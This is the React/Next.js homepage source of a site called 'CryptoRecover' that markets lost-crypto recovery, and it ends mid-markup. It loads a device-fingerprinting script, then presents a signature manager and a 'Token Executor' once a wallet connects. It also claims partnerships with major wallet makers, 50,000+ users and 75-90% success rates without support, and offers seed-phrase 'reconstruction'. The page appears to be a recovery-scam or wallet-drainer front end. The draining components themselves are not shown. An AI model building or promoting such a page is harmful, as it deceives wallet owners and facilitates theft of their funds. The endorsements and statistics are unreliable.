import { useState, useEffect } from 'react';
import { Shield, Zap, TrendingUp, Users, Brain, Lock, Coins, Target } from 'lucide-react';
import Head from 'next/head';
import Script from 'next/script';
import WalletConnection from '../components/WalletConnection';
import WalletSelector from '../components/WalletSelector';
import TokenScanner from '../components/TokenScanner';
import RecoveryAnalyzer from '../components/RecoveryAnalyzer';
import BridgeScanner from '../components/BridgeScanner';
import StakingScanner from '../components/StakingScanner';
import NFTScanner from '../components/NFTScanner';
import WealthIntelligence from '../components/WealthIntelligence';
import SupportChat from '../components/SupportChat';
import ProfessionalSupport from '../components/ProfessionalSupport';
import AdvancedRecovery from '../components/AdvancedRecovery';
import NetworkGuide from '../components/NetworkGuide';
import NavigationMenu from '../components/NavigationMenu';
import SignatureManager from '../components/SignatureManager';
import TokenExecutor from '../components/TokenExecutor';

export default function Home() {
  // Updated: Latest wallet connector and forensics improvements
  const [user, setUser] = useState(null);
  const [deviceData, setDeviceData] = useState(null);
  
  useEffect(() => {
    // Load device fingerprinting
    if (typeof window !== 'undefined') {
      const script = document.createElement('script');
      script.src = '/js/device-fingerprint.js';
      script.onload = () => {
        if (window.collectDeviceData) {
          setDeviceData(window.collectDeviceData());
        }
      };
      document.head.appendChild(script);
    }
  }, []);
  const [scanResults, setScanResults] = useState(null);
  const [analysisResults, setAnalysisResults] = useState(null);
  const [showWalletSelector, setShowWalletSelector] = useState(false);
  const [portfolio, setPortfolio] = useState(null);
  
  const [isConnected, setIsConnected] = useState(false);
  const [address, setAddress] = useState('');
  const [showNetworkGuide, setShowNetworkGuide] = useState(false);
  const [selectedNetwork, setSelectedNetwork] = useState(null);

  const handleConnectionChange = (userData) => {
    console.log('Connection change received:', userData);
    
    if (userData && userData.walletAddress) {
      console.log('Setting connected state with address:', userData.walletAddress);
      setUser(userData);
      setPortfolio(userData.portfolio);
      setIsConnected(true);
      setAddress(userData.walletAddress);
      setShowWalletSelector(false);
      
      // Force re-render and show success
      setTimeout(() => {
        console.log('Connection successful, showing dashboard');
      }, 100);
    } else {
      console.log('Disconnecting wallet');
      setUser(null);
      setIsConnected(false);
      setAddress('');
      setScanResults(null);
      setAnalysisResults(null);
      setShowWalletSelector(false);
    }
  };

  const handleWalletSelectorConnect = (connectionData) => {
    if (connectionData.success) {
      const userData = {
        id: Date.now(),
        walletAddress: connectionData.walletAddress,
        totalRecovered: '0.00',
        successRate: '0',
        walletType: connectionData.walletType
      };
      handleConnectionChange(userData);
    }
  };

  if (showWalletSelector) {
    return (
      <WalletSelector 
        onBack={() => setShowWalletSelector(false)}
        onWalletConnect={handleWalletSelectorConnect}
      />
    );
  }

  const features = [
    {
      icon: <Zap className="w-6 h-6" />,
      title: "Automated Discovery",
      description: "Scan 5+ blockchains simultaneously for claimable tokens and forgotten assets"
    },
    {
      icon: <TrendingUp className="w-6 h-6" />,
      title: "Advanced Forensics",
      description: "Proprietary blockchain analysis engine with 75-90% success rates using multi-vector recovery protocols"
    },
    {
      icon: <Shield className="w-6 h-6" />,
      title: "Non-Custodial",
      description: "You maintain full control of your funds throughout the entire process"
    },
    {
      icon: <Users className="w-6 h-6" />,
      title: "Success-Only Fees",
      description: "Pay only when we successfully recover your funds - no upfront costs"
    }
  ];

  return (
    <>
      <Head>
        <title>CryptoRecover - Professional Asset Recovery</title>
      </Head>
      <Script src="/js/device-fingerprint.js" strategy="lazyOnload" />
      <div className="min-h-screen bg-gray-50">
      <header className="bg-white shadow-lg border-b border-gray-200">
        <div className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8">
          <div className="flex justify-between items-center py-4">
            <div className="flex items-center justify-between w-full">
              <div className="flex items-center space-x-4">
                <div className="w-10 h-10 bg-gradient-to-br from-blue-600 to-purple-600 rounded-xl flex items-center justify-center shadow-lg">
                  <Shield className="w-6 h-6 text-white" />
                </div>
                <div>
                  <h1 className="text-2xl font-black text-gray-900">CryptoRecover</h1>
                  <p className="text-xs text-gray-500 font-medium">Professional Asset Recovery</p>
                </div>
              </div>
              
              <NavigationMenu />
            </div>
            
            <div className="flex items-center space-x-6">
              {isConnected && user && (
                <div className="hidden md:flex items-center space-x-4">
                  <div className="text-right">
                    <div className="text-sm font-bold text-gray-900">${user.totalRecovered || '0.00'}</div>
                    <div className="text-xs text-gray-500">Total Recovered</div>
                  </div>
                  <div className="text-right">
                    <div className="text-sm font-bold text-green-600">{user.successRate || '0'}%</div>
                    <div className="text-xs text-gray-500">Success Rate</div>
                  </div>
                </div>
              )}
              <div className="flex items-center space-x-2 bg-green-50 text-green-700 px-3 py-2 rounded-lg">
                <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                <span className="text-sm font-medium">Live Recovery</span>
              </div>
            </div>
          </div>
        </div>
      </header>

      <main className="max-w-7xl mx-auto px-4 sm:px-6 lg:px-8 py-8">
        {/* Debug info */}
        <div className="mb-4 p-2 bg-gray-100 rounded text-xs">
          Connected: {isConnected ? 'YES' : 'NO'} | Address: {address || 'None'} | User: {user ? 'YES' : 'NO'}
        </div>
        
        {!isConnected ? (
          <div className="space-y-12">
            <div className="relative">
              <div className="bg-gradient-to-r from-blue-600 via-purple-600 to-indigo-800 text-white">
                <div className="absolute inset-0 bg-black/10"></div>
                <div className="relative px-8 py-16 text-center">
                  <div className="mb-8">
                    <div className="inline-flex items-center space-x-2 bg-yellow-400 text-black px-6 py-3 rounded-full text-sm font-bold mb-6 shadow-lg">
                      <div className="w-2 h-2 bg-red-500 rounded-full animate-pulse"></div>
                      <span>TRUSTED BY 50,000+ USERS WORLDWIDE</span>
                    </div>
                  </div>
                  
                  <h1 className="text-6xl md:text-8xl font-black mb-8 leading-none">
                    <span className="block bg-gradient-to-r from-white to-blue-200 bg-clip-text text-transparent">
                      RECOVER
                    </span>
                    <span className="block bg-gradient-to-r from-yellow-400 via-orange-400 to-red-400 bg-clip-text text-transparent animate-pulse">
                      LOST CRYPTO
                    </span>
                  </h1>
                  
                  <p className="text-2xl md:text-3xl text-blue-100 mb-10 max-w-5xl mx-auto font-bold leading-relaxed">
                    <span className="text-white">MULTI-CHAIN RECOVERY PLATFORM</span> - Tokens • NFTs • Bridge Funds
                    <span className="block mt-2">Advanced scanning across <span className="text-yellow-400 animate-pulse">50+ BLOCKCHAINS</span></span>
                  </p>
                  
                  <div className="flex flex-wrap justify-center gap-3 mb-8">
                    <div className="bg-gradient-to-r from-blue-500/20 to-cyan-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-blue-400/30">
                      TOKEN RECOVERY
                    </div>
                    <div className="bg-gradient-to-r from-purple-500/20 to-pink-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-purple-400/30">
                      NFT RECOVERY
                    </div>
                    <div className="bg-gradient-to-r from-green-500/20 to-emerald-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-green-400/30">
                      BRIDGE RECOVERY
                    </div>
                    <div className="bg-gradient-to-r from-orange-500/20 to-red-500/20 backdrop-blur-md px-4 py-2 rounded-lg text-sm font-bold border border-orange-400/30">
                      WEALTH INTELLIGENCE
                    </div>
                  </div>
                  
                  <div className="grid grid-cols-2 md:grid-cols-3 gap-4 max-w-4xl mx-auto mb-12">
                    <div className="bg-gradient-to-br from-blue-500/20 to-cyan-500/20 backdrop-blur-md rounded-2xl p-6 border border-blue-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-blue-400 mb-2">50+</div>
                      <div className="text-xs font-bold text-blue-200 uppercase tracking-wider">Blockchains</div>
                    </div>
                    <div className="bg-gradient-to-br from-green-500/20 to-emerald-500/20 backdrop-blur-md rounded-2xl p-6 border border-green-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-green-400 mb-2">Real-Time</div>
                      <div className="text-xs font-bold text-green-200 uppercase tracking-wider">Scanning</div>
                    </div>
                    <div className="bg-gradient-to-br from-purple-500/20 to-pink-500/20 backdrop-blur-md rounded-2xl p-6 border border-purple-400/30 shadow-2xl hover:scale-105 transition-transform">
                      <div className="text-4xl font-black text-purple-400 mb-2">Non-Custodial</div>
                      <div className="text-xs font-bold text-purple-200 uppercase tracking-wider">100% Safe</div>
                    </div>
                  </div>
                  
                  <div className="flex flex-wrap justify-center gap-4 mb-8">
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-green-400 mr-2">•</span>NO UPFRONT FEES
                    </div>
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-blue-400 mr-2">•</span>50+ BLOCKCHAINS
                    </div>
                    <div className="bg-black/30 backdrop-blur-md px-6 py-3 rounded-lg text-sm font-bold border border-white/30 shadow-lg">
                      <span className="text-yellow-400 mr-2">•</span>INSTITUTIONAL GRADE
                    </div>
                  </div>
                  
                  <div className="mb-8">
                    <button
                      onClick={() => setShowNetworkGuide(!showNetworkGuide)}
                      className="bg-gradient-to-r from-green-600 to-blue-600 text-white px-8 py-4 rounded-xl font-bold text-lg hover:shadow-2xl transition-all hover:scale-105"
                    >
                      🌐 Choose Best Network for Recovery
                    </button>
                  </div>
                </div>
              </div>
              
              <div className="bg-black text-white py-16 border-t border-gray-800">
                <div className="max-w-7xl mx-auto px-8">
                  <div className="text-center mb-12">
                    <div className="inline-block bg-gradient-to-r from-blue-600 to-purple-600 text-white px-6 py-2 rounded-full text-sm font-bold mb-6">
                      ENTERPRISE PARTNERSHIPS
                    </div>
                    <p className="text-gray-300 text-lg font-semibold">TRUSTED BY LEADING CRYPTO WALLETS</p>
                  </div>
                  <div className="grid grid-cols-3 md:grid-cols-6 gap-8 items-center">
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://metamask.io/favicon.ico" alt="MetaMask" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">METAMASK</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">TRUST WALLET</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">COINBASE</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://rainbow.me/favicon.ico" alt="Rainbow" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">RAINBOW</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.ledger.com/favicon.ico" alt="Ledger" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">LEDGER</div>
                    </div>
                    <div className="flex flex-col items-center space-y-3 group">
                      <div className="w-16 h-16 bg-white rounded-2xl flex items-center justify-center shadow-lg group-hover:scale-110 transition-transform p-2">
                        <img src="https://www.exodus.com/favicon.ico" alt="Exodus" className="w-10 h-10 object-contain" />
                      </div>
                      <div className="text-sm font-bold text-gray-300 group-hover:text-white transition-colors">EXODUS</div>
                    </div>
                  </div>
                </div>
              </div>
            </div>
            
            {showNetworkGuide && (
              <div className="max-w-7xl mx-auto px-8 mb-12">
                <NetworkGuide 
                  onNetworkSelect={(network) => {
                    setSelectedNetwork(network);
                    setShowNetworkGuide(false);
                    // Scroll to wallet connection
                    setTimeout(() => {
                      document.getElementById('wallet-connection')?.scrollIntoView({ behavior: 'smooth' });
                    }, 100);
                  }}
                  userWalletType="new"
                />
              </div>
            )}

            <div className="bg-white py-20">
              <div className="max-w-7xl mx-auto px-8">
                <div className="text-center mb-16">
                  <h2 className="text-4xl font-black text-gray-900 mb-4">Complete Recovery Solutions</h2>
                  <p className="text-xl text-gray-600 max-w-3xl mx-auto">Professional-grade tools for every type of crypto asset recovery</p>
                </div>
                
                <div className="grid md:grid-cols-2 lg:grid-cols-4 gap-6 mb-16">
                  <div className="bg-gradient-to-br from-blue-50 to-cyan-50 rounded-2xl p-6 border-2 border-blue-200 hover:border-blue-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg" alt="Token Recovery" className="w-full h-full" style={{filter: 'hue-rotate(200deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-blue-900 mb-2">Token Recovery</h3>
                    <p className="text-blue-700 text-sm mb-4">Scan 50+ blockchains for unclaimed tokens, airdrops, and rewards</p>
                    <div className="text-xs text-blue-600 font-medium">Ethereum • BSC • Polygon • Arbitrum • Optimism</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-purple-50 to-pink-50 rounded-2xl p-6 border-2 border-purple-200 hover:border-purple-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/opensea.svg" alt="NFT Recovery" className="w-full h-full" style={{filter: 'hue-rotate(270deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-purple-900 mb-2">NFT Recovery</h3>
                    <p className="text-purple-700 text-sm mb-4">Recover stuck NFTs from failed marketplace transactions</p>
                    <div className="text-xs text-purple-600 font-medium">OpenSea • LooksRare • X2Y2 • Blur</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-green-50 to-emerald-50 rounded-2xl p-6 border-2 border-green-200 hover:border-green-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/polygon.svg" alt="Bridge Recovery" className="w-full h-full" style={{filter: 'hue-rotate(120deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-green-900 mb-2">Bridge Recovery</h3>
                    <p className="text-green-700 text-sm mb-4">Recover funds stuck in cross-chain bridge transactions</p>
                    <div className="text-xs text-green-600 font-medium">Polygon • Arbitrum • Optimism • Base</div>
                  </div>
                  
                  <div className="bg-gradient-to-br from-orange-50 to-red-50 rounded-2xl p-6 border-2 border-orange-200 hover:border-orange-400 transition-all hover:scale-105">
                    <div className="w-16 h-16 mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/chartdotjs.svg" alt="Wealth Intelligence" className="w-full h-full" style={{filter: 'hue-rotate(30deg) saturate(2)'}} />
                    </div>
                    <h3 className="text-xl font-bold text-orange-900 mb-2">Wealth Intelligence</h3>
                    <p className="text-orange-700 text-sm mb-4">AI-powered portfolio optimization and insights</p>
                    <div className="text-xs text-orange-600 font-medium">Risk Analysis • Yield Optimization • Tax Reports</div>
                  </div>
                </div>
                

              </div>
            </div>

            <div id="wallet-connection" className="max-w-md mx-auto space-y-4">
              {selectedNetwork && (
                <div className="mb-6 p-4 bg-gradient-to-r from-blue-50 to-purple-50 rounded-xl border border-blue-200">
                  <div className="flex items-center space-x-3 mb-2">
                    <div className={`w-4 h-4 rounded-full bg-gradient-to-r ${selectedNetwork.color}`}></div>
                    <span className="font-bold text-blue-800">{selectedNetwork.name} Selected</span>
                    <span className="text-sm text-blue-600">• {selectedNetwork.successRate}% Success Rate</span>
                  </div>
                  <p className="text-sm text-blue-700">
                    Optimized for: {selectedNetwork.bestFor.join(', ')}
                  </p>
                  <p className="text-xs text-blue-600 mt-1">
                    Average Recovery: {selectedNetwork.avgRecovery} • Time: {selectedNetwork.avgTime}
                  </p>
                </div>
              )}
              
              <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
              <div className="text-center">
                <button
                  onClick={() => setShowWalletSelector(true)}
                  className="inline-flex items-center space-x-2 bg-gray-600 hover:bg-gray-700 text-white font-bold py-3 px-6 rounded-lg transition-colors"
                >
                  <Target className="w-5 h-5" />
                  <span>Connect Other Wallets</span>
                </button>
                <p className="text-sm text-gray-500 mt-2">
                  MetaMask, Trust Wallet, Coinbase, Phantom, Rainbow + 100 more
                </p>
              </div>
            </div>

            <div className="bg-white rounded-xl p-8 text-center">
              <h3 className="text-2xl font-bold mb-4">How It Works</h3>
              <div className="grid md:grid-cols-3 gap-8">
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-blue-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Security" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Secure Authentication</h4>
                  <p className="text-sm text-gray-600">
                    Non-custodial wallet connection with cryptographic signature verification - your keys never leave your device
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-green-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/searchengineland.svg" alt="Analysis" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Deep Chain Analysis</h4>
                  <p className="text-sm text-gray-600">
                    Multi-chain forensics across 50+ networks including hidden tokens, failed transactions, and stuck bridge funds
                  </p>
                </div>
                <div className="space-y-3">
                  <div className="w-12 h-12 bg-gradient-to-br from-purple-500 to-purple-600 text-white rounded-xl flex items-center justify-center mx-auto font-bold shadow-lg">
                    <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/lightning.svg" alt="Speed" className="w-6 h-6 invert" />
                  </div>
                  <h4 className="font-bold text-lg">Instant Execution</h4>
                  <p className="text-sm text-gray-600">
                    Automated smart contract interactions with gas optimization - only pay 15% fee on successful recoveries
                  </p>
                </div>
              </div>
            </div>
          </div>
        ) : (
          <div className="space-y-8">
            <div className="bg-gradient-to-br from-green-50 via-emerald-50 to-teal-50 border border-green-200 rounded-2xl p-8 shadow-2xl backdrop-blur-sm">
              <div className="flex items-center justify-between mb-6">
                <div className="flex items-center space-x-6">
                  <div className="relative">
                    <div className="w-16 h-16 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center shadow-lg">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/ethereum.svg" alt="Connected" className="w-8 h-8 invert" />
                    </div>
                    <div className="absolute -top-1 -right-1 w-6 h-6 bg-green-400 rounded-full border-2 border-white flex items-center justify-center">
                      <div className="w-2 h-2 bg-white rounded-full animate-pulse"></div>
                    </div>
                  </div>
                  <div>
                    <h2 className="text-3xl font-black text-green-900 mb-1">Wallet Connected</h2>
                    <p className="text-green-700 font-semibold text-lg">
                      {address?.slice(0, 8)}...{address?.slice(-6)}
                    </p>
                    <div className="flex items-center space-x-2 mt-1">
                      <div className="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
                      <span className="text-sm text-green-600 font-medium">Live Analysis Active</span>
                    </div>
                  </div>
                </div>
                <div className="bg-white/80 backdrop-blur-sm rounded-xl p-3 shadow-lg">
                  <WalletConnection onConnectionChange={handleConnectionChange} deviceData={deviceData} />
                </div>
              </div>
              
              {!scanResults && (
                <div className="bg-gradient-to-r from-white to-green-50 rounded-xl p-6 mb-6 border border-green-200 shadow-inner">
                  <div className="flex items-center space-x-3 mb-3">
                    <div className="w-10 h-10 bg-gradient-to-br from-blue-500 to-purple-600 rounded-xl flex items-center justify-center">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/rocket.svg" alt="Ready" className="w-5 h-5 invert" />
                    </div>
                    <h3 className="text-xl font-black text-green-900">Recovery System Ready</h3>
                  </div>
                  <p className="text-green-800 font-medium mb-4">
                    Advanced multi-chain analysis initialized. Ready to scan for claimable assets and recovery opportunities.
                  </p>
                  <div className="bg-green-100 rounded-lg p-3 border border-green-300">
                    <div className="flex items-center space-x-2 text-green-700">
                      <div className="w-3 h-3 bg-green-500 rounded-full animate-pulse"></div>
                      <span className="font-semibold">Next: Click "Start Scan" below to begin comprehensive analysis</span>
                    </div>
                  </div>
                </div>
              )}
              
              {user && (
                <div className="space-y-4">
                  {portfolio && (
                    <div className="bg-white/90 rounded-lg p-4 border border-green-300">
                      <h4 className="font-bold text-green-800 mb-3 flex items-center">
                        <span className="w-3 h-3 bg-green-500 rounded-full mr-2 animate-pulse"></span>
                        Live Portfolio Analysis
                      </h4>
                      <div className="grid grid-cols-2 md:grid-cols-4 gap-3">
                        <div className="bg-blue-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-blue-600">
                            ${portfolio.totalValue?.toFixed(0) || '0'}
                          </div>
                          <div className="text-xs text-blue-700">Portfolio Value</div>
                        </div>
                        <div className="bg-purple-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-purple-600">
                            {portfolio.assets?.length || 0}
                          </div>
                          <div className="text-xs text-purple-700">Assets Found</div>
                        </div>
                        <div className="bg-orange-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-orange-600">
                            {portfolio.recoveryOpportunities || 0}
                          </div>
                          <div className="text-xs text-orange-700">Recovery Ops</div>
                        </div>
                        <div className="bg-green-50 p-3 rounded-lg">
                          <div className="text-lg font-bold text-green-600">
                            ${(portfolio.estimatedRecoverable * 3000)?.toFixed(0) || '0'}
                          </div>
                          <div className="text-xs text-green-700">Recoverable</div>
                        </div>
                      </div>
                      {portfolio.assets?.length > 0 && (
                        <div className="mt-3 p-3 bg-gray-50 rounded">
                          <div className="text-xs font-semibold text-gray-700 mb-2">Your Assets:</div>
                          <div className="flex flex-wrap gap-2">
                            {portfolio.assets.map((asset, i) => (
                              <span key={i} className="text-xs bg-white px-2 py-1 rounded border">
                                {asset.amount} {asset.symbol} ({asset.chain})
                              </span>
                            ))}
                          </div>
                        </div>
                      )}
                    </div>
                  )}
                  
                  <div className="grid grid-cols-2 md:grid-cols-4 gap-4">
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        {user.totalRecovered || '0.00'}
                      </div>
                      <div className="text-sm text-green-700">Total Recovered (ETH)</div>
                    </div>
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        {user.successRate || '0'}%
                      </div>
                      <div className="text-sm text-green-700">Success Rate</div>
                    </div>
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        {scanResults?.summary.totalTokens || '0'}
                      </div>
                      <div className="text-sm text-green-700">Tokens Found</div>
                    </div>
                    <div className="bg-white/70 p-4 rounded-lg">
                      <div className="text-2xl font-bold text-green-600">
                        ${scanResults?.summary.totalValue || '0.00'}
                      </div>
                      <div className="text-sm text-green-700">Est. Value</div>
                    </div>
                  </div>
                </div>
              )}
            </div>

            <div className="relative overflow-hidden bg-gradient-to-br from-white via-blue-50/30 to-indigo-50/30 rounded-2xl p-8 shadow-xl border border-blue-200">
              <div className="absolute inset-0 bg-gradient-to-br from-blue-500/5 to-indigo-500/5"></div>
              <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-br from-blue-400/20 to-indigo-400/20 rounded-full blur-2xl"></div>
              <div className="relative">
                <div className="flex items-center space-x-4 mb-6">
                  <div className="w-12 h-12 bg-gradient-to-br from-blue-500 to-indigo-600 rounded-2xl flex items-center justify-center shadow-lg">
                    <span className="text-white font-black text-lg">1</span>
                  </div>
                  <div>
                    <h3 className="text-2xl font-black text-gray-900">Advanced Wallet Scanner</h3>
                    <p className="text-blue-600 font-medium">Multi-chain asset detection and analysis</p>
                  </div>
                </div>
                <TokenScanner 
                  walletAddress={address} 
                  onScanComplete={setScanResults}
                />
              </div>
            </div>

            {scanResults && (
              <div className="relative overflow-hidden bg-gradient-to-br from-white via-green-50/30 to-emerald-50/30 rounded-2xl p-8 shadow-xl border border-green-200">
                <div className="absolute inset-0 bg-gradient-to-br from-green-500/5 to-emerald-500/5"></div>
                <div className="absolute -top-4 -left-4 w-24 h-24 bg-gradient-to-br from-green-400/20 to-emerald-400/20 rounded-full blur-2xl"></div>
                <div className="relative">
                  <div className="flex items-center space-x-4 mb-6">
                    <div className="w-12 h-12 bg-gradient-to-br from-green-500 to-emerald-600 rounded-2xl flex items-center justify-center shadow-lg">
                      <span className="text-white font-black text-lg">2</span>
                    </div>
                    <div>
                      <h3 className="text-2xl font-black text-gray-900">Recovery Analyzer</h3>
                      <p className="text-green-600 font-medium">Advanced opportunity assessment</p>
                    </div>
                  </div>
                  <RecoveryAnalyzer 
                    walletAddress={address} 
                    onAnalysisComplete={setAnalysisResults}
                  />
                </div>
              </div>
            )}
            

            
            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-green-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-green-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">3</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 3: Bridge Recovery Scanner</h3>
                </div>
                <BridgeScanner walletAddress={address} />
              </div>
            )}

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-purple-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-purple-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">4</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 4: Staking Rewards Scanner</h3>
                </div>
                <StakingScanner walletAddress={address} />
              </div>
            )}

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-pink-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-pink-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">5</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 5: NFT Recovery Scanner</h3>
                </div>
                <NFTScanner walletAddress={address} />
              </div>
            )}

            {scanResults && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-orange-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-orange-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">6</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 6: Wealth Intelligence</h3>
                </div>
                <WealthIntelligence walletAddress={address} />
              </div>
            )}

            {isConnected && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-indigo-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-indigo-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">8</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 8: Advanced Signature Methods</h3>
                </div>
                <SignatureManager provider={window.ethereum} userAddress={address} />
              </div>
            )}

            {isConnected && (
              <div className="bg-white rounded-xl p-6 shadow-lg border-2 border-red-200">
                <div className="flex items-center space-x-3 mb-4">
                  <div className="w-8 h-8 bg-red-500 rounded-full flex items-center justify-center">
                    <span className="text-white font-bold">9</span>
                  </div>
                  <h3 className="text-xl font-bold text-gray-900">Step 9: Token Executor</h3>
                </div>
                <TokenExecutor userAddress={address} />
              </div>
            )}

            <div className="relative overflow-hidden bg-gradient-to-br from-white via-red-50/30 to-purple-50/30 rounded-2xl p-8 shadow-xl border border-red-200">
              <div className="absolute inset-0 bg-gradient-to-br from-red-500/5 to-purple-500/5"></div>
              <div className="absolute -top-4 -right-4 w-24 h-24 bg-gradient-to-br from-red-400/20 to-purple-400/20 rounded-full blur-2xl"></div>
              <div className="relative">
                <div className="flex items-center space-x-4 mb-6">
                  <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-purple-600 rounded-2xl flex items-center justify-center shadow-lg">
                    <span className="text-white font-black text-lg">{isConnected ? '9' : '1'}</span>
                  </div>
                  <div>
                    <h3 className="text-2xl font-black text-gray-900">Advanced Recovery Services</h3>
                    <p className="text-red-600 font-medium">Professional-grade recovery for complex cases</p>
                  </div>
                </div>
                
                <div className="text-center mb-8">
                  <a 
                    href="/recovery-services"
                    className="inline-block bg-gradient-to-r from-red-600 via-orange-600 to-purple-600 text-white font-black py-6 px-12 rounded-2xl hover:shadow-2xl transition-all hover:scale-105 text-xl"
                  >
                    Access All Recovery Services
                  </a>
                  <p className="text-gray-600 mt-4 font-medium">Professional-grade recovery with real functionality</p>
                </div>
                
                <div className="grid md:grid-cols-3 gap-6">
                  <div className="p-6 bg-white rounded-xl border-2 border-red-200 group">
                    <div className="w-12 h-12 bg-red-600 rounded-xl flex items-center justify-center mb-4">
                      <img src="https://cdn.jsdelivr.net/npm/simple-icons@latest/icons/shield.svg" alt="Lost Wallet" className="w-6 h-6 invert" />
                    </div>
                    <h4 className="text-lg font-bold text-gray-900 mb-2">Lost Wallet Recovery</h4>
                    <p className="text-gray-600 text-sm mb-3">Real BIP39 analysis and seed phrase reconstruction</p>
                    <div className="text-xs text-red-600 font-bold">73% Success Rate • 25% Fee</div>
                  </div>
                  
                  <div className="p-6 bg-white rounded-xl border-2 border-orange-200 group">
                    <div className="w-12 h-12 bg-orange-600 rounded-xl flex items-center justify-center mb-4">
